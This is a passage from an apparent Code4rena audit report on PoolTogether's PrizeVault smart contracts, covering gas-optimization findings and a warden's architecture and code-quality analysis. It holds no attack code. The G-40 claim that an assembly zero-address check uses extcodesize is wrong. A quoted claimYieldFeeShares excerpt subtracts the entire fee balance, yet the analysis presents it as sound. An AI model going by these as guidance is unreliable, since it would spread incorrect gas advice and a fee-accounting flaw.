[28](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/interfaces/IVaultHooks.sol#L28) | [42](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/interfaces/IVaultHooks.sol#L42)

</details>

## [G-40] Use assembly to check for `address(0)`

The usage of inline assembly to check if variable is the zero can save gas compared to traditional `require` or `if` statement checks. The assembly check uses the `extcodesize` operation which is generally cheaper in terms of gas.

[More information can be found here.](https://medium.com/@kalexotsu/solidity-assembly-checking-if-an-address-is-0-efficiently-d2bfe071331)

7 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
300: if (address(yieldVault_) == address(0)) revert YieldVaultZeroAddress();
301: if (owner_ == address(0)) revert OwnerZeroAddress();
743: if (address(_liquidationPair) == address(0)) revert LPZeroAddress();
```

[300](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L300) | [301](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L301) | [743](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L743)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
47: if (address(0) == address(twabController_)) revert TwabControllerZeroAddress();
```

[47](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L47)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
65: if (address(prizePool_) == address(0)) revert PrizePoolZeroAddress();
97: if (recipient == address(0)) revert ClaimRecipientZeroAddress();
129: if (_claimer == address(0)) revert ClaimerZeroAddress();
```

[65](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L65) | [97](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L97) | [129](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L129)

</details>

## [G-41] `internal`/`private` functions only called once can be inlined to save gas

`internal` functions that are only called once should be inlined to save gas. 
Not inlining such functions costs an extra 20 to 40 gas due to the additional `JUMP` instructions and stack operations required for function calls.

2 issue instances in 2 files:

```solidity
File: pt-v5-vault/src/PrizeVault.sol
/// @audit function `_tryGetAssetDecimals()` called only once
772: function _tryGetAssetDecimals(IERC20 asset_) internal view returns (bool, uint8) {
```

[772](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L772)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
/// @audit function `_setClaimer()` called only once
128: function _setClaimer(address _claimer) internal {
```

[128](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L128)

## [G-42] Declare `immutable` as `private` to save gas

Using `private` instead of `public` for immutables saves gas. The compiler doesn't need to create non-payable getter functions for deployment calldata, store the bytes of the value outside of where it's used, or add another entry to the method ID table, saving 3406-3606 gas in deployment.

4 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
112: uint256 public immutable yieldBuffer;
115: IERC4626 public immutable yieldVault;
```

[112](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L112) | [115](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L115)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
26: TwabController public immutable twabController;
```

[26](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L26)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
24: PrizePool public immutable prizePool;
```

[24](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L24)

</details>

## [G-43] Optimize names to save gas

Function names for public and external methods, as well as public state variable names, can be optimized to achieve gas savings.
By renaming functions to generate method IDs with two leading zero bytes, you can save 128 gas during contract deployment.
Further, renaming functions for lower method IDs can conserve 22 gas per call for each sorted position shifted.

Optimizing function names for gas efficiency can result in significant savings, especially for frequently called functions or heavily deployed contracts. 
Reference: [Solidity Gas Optimizations - Function Name](https://blog.emn178.cc/en/post/solidity-gas-optimization-function-name/)

5 issue instances in 5 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
65: contract PrizeVault is TwabERC20, Claimable, IERC4626, ILiquidationSource, Ownable {
```

[65](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L65)

```solidity
File: pt-v5-vault/src/PrizeVaultFactory.sol
13: contract PrizeVaultFactory {
```

[13](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVaultFactory.sol#L13)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
19: contract TwabERC20 is ERC20, ERC20Permit {
```

[19](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L19)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
13: abstract contract Claimable is HookManager, IClaimable {
```

[13](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L13)

```solidity
File: pt-v5-vault/src/abstract/HookManager.sol
9: abstract contract HookManager {
```

[9](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/HookManager.sol#L9)

</details>

## [G-44] Avoid updating storage when the value hasn't changed

A check regarding whether the current value and the new value are the same should be added. This helps prevent unnecessary state changes and events in case the new value is the same as the current value.

7 issue instances in 2 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
/// @audit Missing `_claimer` check before state change
736: _setClaimer(_claimer);
/// @audit Missing `_liquidationPair` check before state change
744: liquidationPair = _liquidationPair;
/// @audit Missing `_yieldFeePercentage` check before state change
754: _setYieldFeePercentage(_yieldFeePercentage);
/// @audit Missing `_yieldFeeRecipient` check before state change
760: _setYieldFeeRecipient(_yieldFeeRecipient);
/// @audit Missing `_yieldFeePercentage` check before state change
951: yieldFeePercentage = _yieldFeePercentage;
/// @audit Missing `_yieldFeeRecipient` check before state change
959: yieldFeeRecipient = _yieldFeeRecipient;
```

[736](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L736) | [744](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L744) | [754](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L754) | [760](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L760) | [951](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L951) | [959](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L959)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
/// @audit Missing `_claimer` check before state change
130: claimer = _claimer;
```

[130](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L130)

</details>

## [G-45] Optimize external calls with Assembly for memory efficiency

Using interfaces to make external contract calls in Solidity is convenient but can be inefficient in terms of memory utilization.
Each such call involves creating a new memory location to store the data being passed, thus incurring memory expansion costs. 

Inline assembly allows for optimized memory usage by re-using already allocated memory spaces or using the scratch space for smaller datasets.
This can result in notable gas savings, especially for contracts that make frequent external calls.

Additionally, using inline assembly enables important safety checks like verifying if the target address has code deployed to it using `extcodesize(addr)` before making the call, mitigating risks associated with contract interactions.

24 issue instances in 3 files:

<details>

```solidity
File: pt-v5-vault/src/PrizeVault.sol
337: return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
382: uint256 _latentBalance = _asset.balanceOf(address(this));
383: uint256 _maxYieldVaultDeposit = yieldVault.maxDeposit(address(this));
405: uint256 _maxWithdraw = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
416: uint256 _maxWithdraw = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
539: if (_asset.allowance(_owner, address(this)) != _assets) {
            IERC20Permit(address(_asset)).permit(_owner, address(this), _assets, _deadline, _v, _r, _s);
639: _maxAmountOut = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
854: _asset.safeTransferFrom(
            _caller,
            address(this),
            _assets
        );
861: uint256 _assetsWithDust = _asset.balanceOf(address(this));
862: _asset.approve(address(yieldVault), _assetsWithDust);
865: uint256 _yieldVaultShares = yieldVault.previewDeposit(_assetsWithDust);
866: uint256 _assetsUsed = yieldVault.mint(_yieldVaultShares, address(this));
869: _asset.approve(address(yieldVault), 0);
922: return yieldVault.convertToAssets(yieldVault.maxRedeem(address(this)));
931: uint256 _latentAssets = _asset.balanceOf(address(this));
934: uint256 _yieldVaultShares = yieldVault.previewWithdraw(_assets - _latentAssets);
936: yieldVault.redeem(_yieldVaultShares, address(this), address(this));
939: _asset.transfer(_receiver, _assets);
```

[337](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L337) | [382](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L382) | [383](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L383) | [405](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L405) | [416](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L416) | [539](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L539) | [639](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L639) | [854](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L854) | [861](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L861) | [862](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L862) | [865](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L865) | [866](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L866) | [869](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L869) | [922](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L922) | [931](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L931) | [934](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L934) | [936](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L936) | [939](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L939)

```solidity
File: pt-v5-vault/src/TwabERC20.sol
59: return twabController.balanceOf(address(this), _account);
64: return twabController.totalSupply(address(this));
77: twabController.mint(_receiver, SafeCast.toUint96(_amount));
88: twabController.burn(_owner, SafeCast.toUint96(_amount));
101: twabController.transfer(_from, _to, SafeCast.toUint96(_amount));
```

[59](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L59) | [64](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L64) | [77](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L77) | [88](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L88) | [101](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/TwabERC20.sol#L101)

```solidity
File: pt-v5-vault/src/abstract/Claimable.sol
99: uint256 prizeTotal = prizePool.claimPrize(
            _winner,
            _tier,
            _prizeIndex,
            recipient,
            _reward,
            _rewardRecipient
        );
```

[99](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/abstract/Claimable.sol#L99)

</details>

**[trmid (PoolTogether) confirmed](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/236#issuecomment-1997879293)**

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/236#issuecomment-2011206176):**
 > Around 30 findings are known issues. Check details [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/326#issuecomment-2007608495).

***

# Audit Analysis

For this audit, 15 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/305) by **0xepley** received the top score from the judge.

*The following wardens also submitted reports: [fouzantanveer](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/299), [DarkTower](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/63), [JCK](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/341), [hunter\_w3b](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/298), [SAQ](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/289), [clara](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/288), [McToady](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/234), [popeye](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/227), [albahaca](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/203), [LinKenji](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/160), [K42](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/153), [aariiif](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/150), [kaveyjoe](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/148), and [ZanyBonzy](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/111).*

## Conceptual overview of the project:

The PoolTogether project encapsulates a decentralized finance protocol, ingeniously designed to offer a no-loss savings game powered by yield-generating activities on the Ethereum blockchain. Essentially, it's a protocol where users' deposits are pooled together to earn yield, and this yield is then distributed as prizes, adding a gamified incentive to save.

At the heart of the project lies the PrizeVault contract, which is the cornerstone of the PoolTogether V5 upgrade. The PrizeVault, a smart contract built on top of the ERC4626 standard, serves as a depository for user funds. It interacts with an underlying yield vault to employ deposited assets in yield-generating strategies. The yields accrued are then periodically liquidated into a prize pool token and distributed as prizes among depositors, who stand a chance to win without risking their principal investment.

The process begins when users deposit their tokens into the PrizeVault. Upon deposit, the corresponding number of shares, which represent the depositor's stake in the vault, are minted. These shares are not just static representations of the user's balance but are dynamically tracked using a TWAB (Time-Weighted Average Balance) mechanism, which is capable of capturing the user’s historical balances. This TWAB mechanism, managed by a separate TwabController, allows the protocol to determine the depositor's eligibility for prizes over time.

The integration with the ERC4626 standard offers composability with other DeFi protocols and allows the PrizeVault to be an autonomous entity capable of yield farming. Furthermore, the PrizeVault contains mechanisms to mitigate rounding errors in yield accruals, ensuring that users can reclaim the exact amount of their initial deposits, thereby reinforcing the 'no-loss' essence of PoolTogether.

When the yield is generated, it triggers the liquidation process. Here, a liquidation pair is used to auction the yield for the prize token, which is then contributed to the Prize Pool. This process is governed by a set of timed auctions that ensure efficient price discovery and incentivize participants to complete these transactions promptly.

The project’s architecture also includes a Factory pattern through the PrizeVaultFactory contract, allowing for the streamlined creation of new PrizeVaults with custom parameters. It provides an easy way to scale and create multiple prize-generating pools with diverse underlying assets.

A Claimable extension is integrated within the PrizeVault, enabling automated prize claims using an external claimer contract. It also facilitates the users to set custom hooks, essentially callback functions that execute upon the claim event, offering a bespoke touch to the prize distribution.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-pooltogether-findings/issues/305).*

## System Overview

### Smart Contract: PrizeVault.sol

This is the heart of the protocol where users deposit their tokens. The deposited tokens are used within an underlying yield source to earn returns. The yield is then liquidated and contributed to the Prize Pool as prize tokens. When the Prize Pool awards a prize, the yield is distributed to the winner. This contract is also responsible for mitigating loss due to rounding errors, by employing strategies like the "dust collection strategy" and maintaining a "yield buffer".

**Key Functions:**
- `decimals`: Defines the token's decimal precision.
- `totalAssets`: Calculates the total assets within the vault.
- `convertToShares`: Converts asset amounts to equivalent shares.
- `convertToAssets`: Converts share amounts to equivalent assets.
- `maxDeposit`: Determines the maximum deposit possible by an address.
- `maxMint`: Calculates the maximum mintable shares.
- `maxWithdraw`: Provides the maximum amount withdrawable by an owner.
- `maxRedeem`: Returns the maximum shares redeemable by an owner.
- `previewDeposit`: Forecasts shares for a given asset deposit.
- `previewMint`: Estimates assets needed for minting shares.
- `previewWithdraw`: Foresees shares needed to withdraw assets.
- `previewRedeem`: Previews assets for redeeming shares.
- `deposit`: Exchanges assets for share tokens.
- `mint`: Mints shares in return for assets.
- `withdraw`: Exchanges shares for underlying assets.
- `redeem`: Redeems shares for assets.
- `sponsor`: Deposits assets without becoming eligible for prizes.

**Liquidation Functions:**
- `liquidatableBalanceOf`: Returns the amount available for liquidation.
- `transferTokensOut`: Transfers liquidated tokens out of the contract.
- `verifyTokensIn`: Validates incoming tokens for liquidation.
- `targetOf`: Indicates the target contract for liquidation.

**Yield Functions:**
- `totalYieldBalance`: Computes the total yield balance in the vault.
- `availableYieldBalance`: Determines the yield available for use.
- `currentYieldBuffer`: Returns the current yield buffer value.
- `claimYieldFeeShares`: Claims shares of the yield fee.

**Administrative Functions:**
- `setClaimer`: Assigns the claimer contract.
- `setLiquidationPair`: Sets the liquidation pair contract.
- `setYieldFeePercentage`: Configures the yield fee percentage.
- `setYieldFeeRecipient`: Specifies the recipient for yield fees.

**Yield-Related Adjustments:**
- `depositWithPermit`: Approves and deposits assets using a permit.

### PrizeVaultFactory.sol

This contract is the manufacturing hub, so to speak, where new PrizeVault instances are minted. When deploying a PrizeVault, this factory contract initializes it with the necessary configurations, including the name, symbol, underlying yield vault, and the Prize Pool it contributes to. It also sends a starting balance to cover initial yield buffer requirements.

**Key Functions:**
- `deployVault`: Initiates a new PrizeVault instance.
- `totalVaults`: Counts all deployed PrizeVaults.

### TwabERC20.sol

Think of this contract as a specialized accounting ledger that keeps track of the token balances in the PrizeVault. It records balances using the Time-Weighted Average Balance method, which is critical for calculating the chance of winning in the Prize Pool. It overrides standard ERC20 functions to integrate with the TwabController.

**Key Functions:**
- `balanceOf`: Returns the time-weighted balance of an account.
- `totalSupply`: Reflects the total supply with TWAB adjustments.

**Token Transfer Overrides:**
- `_mint`: Issues new tokens and logs them in TWAB.
- `_burn`: Destroys tokens and updates TWAB.
- `_transfer`: Moves tokens between accounts with TWAB recording.

### Claimable.sol

This extension allows for prizes to be claimed on behalf of winners, enabling automated prize distribution. It integrates with the Prize Pool and can execute additional logic (hooks) before and after the prize claim event, allowing for custom actions like minting NFTs or triggering other smart contract functions.

**Key Functions:**
- `claimPrize`: Executes the prize claim process with optional hooks.
- `_setClaimer`: Internally sets the claiming agent.

### HookManager.sol

This contract acts as a settings panel for users to manage their hooks. 

**Key Functions:**
- `getHooks`: Retrieves the configured hooks for an account.
- `setHooks`: Allows a user to define their prize claim hooks.

### IVaultHooks.sol

 This interface defines the structure for the hooks themselves. Any smart contract that wishes to interact with PrizeVault via hooks must implement this interface. The hooks offer customizability and extend the PrizeVault's capabilities by introducing actions that occur in response to prize claims.

**Prize Hook Categories:**

  - **Before Claim Prize Hooks:**
    - `beforeClaimPrize`: Hook to manage actions before prize claim.
  - **After Claim Prize Hooks:**
    - `afterClaimPrize`: Hook to manage actions after prize claim.

## Roles in the System

For each smart contract in the PoolTogether protocol, there are specific roles involved with distinct responsibilities. Here's a breakdown of these roles for each smart contracts:

### `PrizeVault.sol` 

**Admin/Owner Roles**
- **Yield Management**: Responsible for adjusting yield strategies, yield fee percentages, and yield buffer to optimize the prize generation process.
- **Relevant Code**:
    ```solidity
    function setYieldFeePercentage(uint32 _yieldFeePercentage) external onlyOwner {...}
    function setYieldFeeRecipient(address _yieldFeeRecipient) external onlyOwner {...}
    function setLiquidationPair(address _liquidationPair) external onlyOwner {...}
    ```

**User/Depositor Roles**
- **Asset Management**: Users are tasked with depositing assets and can manage their investments by withdrawing assets or redeeming them for shares.
- **Relevant Code**:
    ```solidity
    function withdraw(uint256 _assets, address _receiver, address _owner) external returns (uint256) {...}
    function redeem(uint256 _shares, address _receiver, address _owner) external returns (uint256) {...}
    ```

**Liquidation Pair**
- **Liquidation Executor**: A designated contract or address authorized to liquidate yield for prize distribution, managing the conversion of accrued yield into prizes.
- **Relevant Code**:
    ```solidity
    function transferTokensOut(address, address _receiver, address _tokenOut, uint256 _amountOut) public onlyLiquidationPair returns (bytes memory) {...}
    ```

**Yield Fee Recipient**
- **Fee Collection**: An entity designated to receive a portion of the yield as fees. This role involves claiming accumulated fees and managing them strategically.
- **Relevant Code**:
  ```solidity
  function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {...}
  ```

### `PrizeVaultFactory.sol`

**Deployer**: The entity that utilizes the factory to create new instances of `PrizeVault`.
- **Responsibility**: To create new Prize Vaults with specific configurations tailored to different strategies or assets.
- **Relevant Code**:
    ```solidity
    function deployVault(...) external returns (PrizeVault) {...}
    ```

### `TwabERC20.sol`

**Holder**: Any entity that owns the token.
- **Responsibility**: To participate in the protocol by holding tokens, which represent their share of the vault and eligibility for prizes.
- **Relevant Code**:
    ```solidity
    function balanceOf(address _account) public view virtual override(ERC20) returns (uint256) {...}
    ```

### `Claimable.sol`

**Claimer**: An external or integrated contract authorized to claim prizes on behalf of winners.
- **Responsibility**: To facilitate the automated claiming of prizes, reducing the need for manual interaction by winners.
- **Relevant Code**:
    ```solidity
    function claimPrize(...) external onlyClaimer returns (uint256) {...}
    ```

**User/Winner**: A user who has won a prize.
- **Responsibility**: May set up hooks for automated actions upon winning a prize.
- **Relevant Code**:
    ```solidity
    // Users can manage hooks but specific code interaction is through claimPrize, managed by the Claimer.
    ```

### `HookManager.sol`

**User**: Anyone utilizing the protocol that wishes to add custom behavior upon winning prizes.
- **Responsibility**: To define custom actions through hooks that execute in the context of prize claims.
- **Relevant Code**:
    ```solidity
   function setHooks(VaultHooks calldata hooks) external {...}
    ```

### `IVaultHooks.sol`

**Developer/Implementer**: The entity that develops custom hook contracts adhering to this interface.
- **Responsibility**: To create innovative functionalities that can be executed before or after prizes are claimed, enhancing user experience or automating specific tasks.
- **Relevant Code**:
    ```solidity
    function beforeClaimPrize(...) external returns (address);
    function afterClaimPrize(...) external;
    ```

## Codebase Quality

Overall, I consider the quality of the PoolTogether protocol codebase to be of high caliber. The codebase exhibits mature software engineering practices with a strong emphasis on security, modularity, and clear documentation. The smart contracts leverage established standards, which demonstrates adherence to best practices within the Ethereum development community. Details are explained below:

| Codebase Quality Categories                     | Comments |
| ----------------------------------------------- | -------- |
| **Standards Compliance** | The contracts utilize ERC standards such as ERC-4626 for vault standardization. This compliance fosters interoperability and standard operations across the DeFi ecosystem. |
| **Modularity and Reusability** | Contracts like `PrizeVault` and `Claimable` are crafted with modularity in mind, promoting code reusability. This structure allows for more straightforward updates and potential integrations with other protocols. |
| **Readability and Documentation** | Comments and documentation are thorough, enhancing the readability of the code. NatSpec comments are present, enabling automated documentation generation and a better understanding of complex functions. |
| **Test Coverage and Security** | With 99% test coverage reported, this indicates nearly exhaustive testing of all code paths and scenarios, Such a high level of test coverage contributes significantly to the overall confidence in the codebase's reliability and security. |
| **Upgradeability and Maintenance** | The presence of factory patterns and the use of immutable variables where appropriate indicate a strategy for future-proofing and ease of maintenance. |
| **Error Handling and Data Validity** | The code includes comprehensive error handling with custom errors, which is an improvement over generic `revert` statements. This assists developers in identifying issues quickly. |
| **Resource Efficiency**  | Efficient use of gas is indicated by the careful structuring of loops, conditionals, and state changes, although specific gas optimization practices are not detailed here. |
| **Consistency and Coding Conventions** | The codebase adheres to common Solidity conventions and naming standards, contributing to a consistent and predictable code structure. |
| **Security Measures and Auditing** | The design pattern suggests that security has been a significant focus. Mention of audits would be necessary to validate the security rigorously, although this is not provided in the current context. |

## Mathematical Overview of the PoolTogether Protocol

The PoolTogether protocol incorporates various mathematical functions and principles to manage its prize-linked savings system. Below, we delve into the core mathematical aspects of the protocol, focusing primarily on the `PrizeVault.sol` contract, which plays a crucial role in managing user deposits, yield generation, and prize distribution.

### Yield Generation and Distribution

1. **Yield Buffer Management** - The `PrizeVault` contract utilizes a yield buffer to ensure that small rounding errors in yield generation don't affect the user's ability to withdraw their full deposit. The yield buffer (`yieldBuffer`) is a predefined quantity of assets reserved to cover these errors.

2. **Asset and Share Conversion** - The protocol uses functions to convert between deposited assets and vault shares. These conversions account for the total debt (totalAssets - yieldBuffer) and the underlying yield vault's exchange rate to ensure users can always withdraw their deposits minus any incurred yield vault losses.
    - **Conversion to Shares**:
  
      ```solidity
      function convertToShares(uint256 _assets) public view returns (uint256) {
            uint256 totalDebt_ = totalDebt();
            uint256 _totalAssets = totalAssets();
            if (_totalAssets >= totalDebt_) {
                return _assets;
            } else {
                return _assets.mulDiv(totalDebt_, _totalAssets, Math.Rounding.Down);
            }
        }
      ```

    - **Conversion to Assets**:
  
      ```solidity
      function convertToAssets(uint256 _shares) public view returns (uint256) {
            uint256 totalDebt_ = totalDebt();
            uint256 _totalAssets = totalAssets();
            if (_totalAssets >= totalDebt_) {
                return _shares;
            } else {
                return _shares.mulDiv(_totalAssets, totalDebt_, Math.Rounding.Down);
            }
        }
      ```

3. **Max Deposit and Withdraw Calculation** - The maximum deposit and withdrawal amounts are dynamically calculated to ensure the vault's total share supply doesn't exceed the `uint96` limit set by the `TwabController`, and to manage the total assets under yield generation without depleting the yield buffer.

    - **Max Deposit Calculation**:
  
      ```solidity
      function maxDeposit(address) public view returns (uint256) {
            uint256 _totalSupply = totalSupply();
            uint256 totalDebt_ = _totalDebt(_totalSupply);
            if (totalAssets() < totalDebt_) return 0;

            uint256 twabSupplyLimit_ = _twabSupplyLimit(_totalSupply);
            uint256 _maxDeposit;
            uint256 _latentBalance = _asset.balanceOf(address(this));
            uint256 _maxYieldVaultDeposit = yieldVault.maxDeposit(address(this));
            if (_latentBalance >= _maxYieldVaultDeposit) {
                return 0;
            } else {
                unchecked {
                    _maxDeposit = _maxYieldVaultDeposit - _latentBalance;
                }
                return twabSupplyLimit_ < _maxDeposit ? twabSupplyLimit_ : _maxDeposit;
            }
        }
      ```

    - **Max Withdraw Calculation**:
  
      ```solidity
      function maxWithdraw(address _owner) public view returns (uint256) {
            uint256 _maxWithdraw = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));

            uint256 _ownerAssets = convertToAssets(balanceOf(_owner));
            return _ownerAssets < _maxWithdraw ? _ownerAssets : _maxWithdraw;
        }
      ```

4. **Yield Fee and Liquidation** - A portion of the generated yield is reserved as a fee, which can be claimed by a designated yield fee recipient. The liquidation process involves converting the generated yield into the prize token, taking into account the yield fee percentage.

    - **Yield Fee Calculation**:
  
      ```solidity
      function liquidatableBalanceOf(address _tokenOut) public view returns (uint256) {
            uint256 _totalSupply = totalSupply();
            uint256 _maxAmountOut;
            if (_tokenOut == address(this)) {
                // Liquidation of vault shares is capped to the TWAB supply limit.
                _maxAmountOut = _twabSupplyLimit(_totalSupply);
            } else if (_tokenOut == address(_asset)) {
                // Liquidation of yield assets is capped at the max yield vault withdrawal plus any latent balance.
                _maxAmountOut = _maxYieldVaultWithdraw() + _asset.balanceOf(address(this));
            } else {
                return 0;
            }
      ```

    - **Fee Accrual and Claiming**:
  
      ```solidity
      function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
            if (_shares == 0) revert MintZeroShares();

            uint256 _yieldFeeBalance = yieldFeeBalance;
            if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);

            yieldFeeBalance -= _yieldFeeBalance;

            _mint(msg.sender, _shares);

            emit ClaimYieldFeeShares(msg.sender, _shares);
        }
      ```

These mathematical functions ensure that the PoolTogether protocol can manage user deposits, generate yield, and distribute prizes in a secure and efficient manner. The interactions between these functions enable the protocol to adjust to changing conditions, such as yield rates and asset values, ensuring the sustainability of the prize-linked savings system.

## Archietecture and WorkFlow

| File Name | Core Functionality  | Technical Characteristics  | Importance and Management |
| ------ | -------------------- | ---------------- | ------------ |
| `PrizeVault.sol` | Manages user deposits and earnings to generate prizes. It interacts with the ERC4626 yield vault to accrue yield which is then liquidated for prizes. It ensures users are eligible for prizes without losing their principal. | Implements ERC4626 for standard vault operations, contains logic for handling deposits, withdrawals, and liquidation of yield, and maintains meticulous balance tracking via the TWAB mechanism. Also integrates error handling and optimization for gas and reentrancy protection. | This contract is central to the functionality of the protocol as it directly manages user assets and their prize eligibility. Robust management of this contract is vital due to its control over funds and the complexity of its interactions with other protocol components. |
| `PrizeVaultFactory.sol`| Provides a means to deploy new PrizeVaults using a standard ERC4626 yield vault. It also acts as a registry for all deployed PrizeVaults. | Employs a factory pattern for creating new PrizeVault instances, uses CREATE2 for predictable addresses, and tracks all deployed instances for transparency and governance. | The factory contract is crucial for scaling the protocol's capacity to introduce new pools and manage them efficiently. It should be managed with caution to prevent the deployment of erroneous or unauthorized PrizeVault instances. |
| `TwabERC20.sol` | A specialized ERC20 token that records time-weighted average balances, providing historical balance information for each holder, which is necessary for determining prize eligibility. | Extends ERC20 and ERC20Permit for token standards and utilizes SafeCast for safe type conversions, focusing on accurate balance tracking over time.| It serves a critical role in tracking user balances for the prize determination process. Regular updates and audits are essential to ensure its accuracy and security. |
